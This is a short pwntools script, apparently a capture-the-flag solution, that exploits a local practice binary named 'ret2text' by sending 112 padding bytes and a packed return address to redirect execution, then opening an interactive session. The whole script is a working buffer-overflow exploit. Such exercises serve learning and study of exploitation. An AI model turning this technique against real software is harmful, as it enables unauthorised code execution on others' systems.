from pwn import *

context(arch='amd64',os='linux',log_level='debug')

p = process('./ret2text')
target = 0x804863a
p.recvuntil('anything?')
p.sendline(b'A' * 112 + p32(target))
p.interactive()